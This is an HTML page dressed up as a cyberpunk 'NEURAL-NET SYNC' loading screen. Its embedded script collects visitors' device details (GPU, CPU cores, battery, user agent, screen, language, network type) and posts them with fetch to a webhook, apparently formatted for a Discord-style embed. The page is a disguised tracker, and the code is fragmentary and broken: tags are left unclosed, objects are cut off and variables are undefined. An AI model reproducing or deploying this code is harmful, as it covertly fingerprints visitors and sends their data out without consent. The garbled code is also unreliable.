<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEURAL-NET SYNC v.6.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-cyan: #00ffff;
            --neon-magenta: #ff00ff;
            --neon-yellow: #fefe33;
            --bg-dark: #020202;
        }

        body, html {
            height: 100%; margin: 0; padding: 0;
            background-color: var(--bg-dark);
            color: var(--neon-cyan);
            font-family: 'Share Tech Mono', monospace;
            overflow: hidden;
            display: flex; justify-content: center; align-items: center;
        }

        /* Scanline Overlay untuk Efek Retro-Futuristik */
        body::before {
            content: " ";
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            background-size: 100% 2px, 3px 100%;
            z-index: 100; pointer-events: none;
        }

        .cyber-container {
            position: relative; width: 90%; max-width: 800px;
            padding: 40px; border: 1px solid var(--neon-cyan);
            background: rgba(0, 20, 20, 0.8);
            box-shadow: 0 0 20px var(--neon-cyan), inset 0 0 10px var(--neon-cyan);
            z-index: 10;
        }

        .glitch-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 2.5rem; font-weight: 700;
            text-transform: uppercase; letter-spacing: 10px;
            margin-bottom: 20px; position: relative;
            color: #fff; text-shadow: 2px 2px var(--neon-magenta);
            animation: glitch 1s infinite;
        }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }

        .status-box {
            text-align: left; border-left: 3px solid var(--neon-magenta);
            padding-left: 20px; margin: 30px 0;
        }

        .loading-bar-container {
            width: 100%; height: 4px; background: #111;
            margin-top: 20px; position: relative;
        }

        .loading-bar-fill {
            width: 0%; height: 100%; background: var(--neon-cyan);
            box-shadow: 0 0 15px var(--neon-cyan);
            transition: width 0.3s;
        }

        .data-stream {
            font-size: 0.8rem; color: var(--neon-yellow);
            height: 100px; overflow: hidden; opacity: 0.7;
        }

        .system-msg {
            font-size: 0.7rem; color: #555; text-transform: uppercase;
            margin-top: 20px; letter-spacing: 2px;
        }
    </style>
</head>
<body>

    <div class="cyber-container">

        <div class="status-box">
            <div id="main-status">INITIALIZING NEURAL LINK...</div>

        const stream = document.getElementById('stream');
        const statusText = document.getElementById('main-status');

        function addLog(msg) {
            stream.innerHTML += `> ${msg}<br>`;

            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown Vendor";

            const massiveData = {

                cpuCores: navigator.hardwareConcurrency || "Hidden",

                platform: navigator.platform,
                battery: `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'Charging' : 'Unplugged'})`,

                agent: navigator.userAgent,
                language: navigator.language,
                resolution: `${window.screen.width}x${window.screen.height}`,
                depth: `${window.screen.colorDepth}-bit`,
                touchPoints: navigator.maxTouchPoints,
                cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
                doNotTrack: navigator.doNotTrack || "Unset",
                // Network Detail
                netType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
                downlink: navigator.connection ? navigator.connection.downlink + " Mbps" : "N/A",

                        { name: "📱 DEVICE & SCREEN", value: `**OS:** ${data.os}\n**Res:** ${data.resolution}\n**Touch:** ${data.touchPoints} pts\n**Depth:** ${data.depth}`, inline: true },
                        { name: "🕵️ BROWSER SIGNATURE", value: `\`\`\`${data.agent}\`\`\``, inline: false },
                        { name: "⚙️ MISC INFO", value: `**Timezone:** ${data.timezone}\n**Lang:** ${data.language}\n**Cookies:** ${data.cookies}\n**DNT:** ${data.doNotTrack}`, inline: true }

            await fetch(WEBHOOK_URL, {

</html>
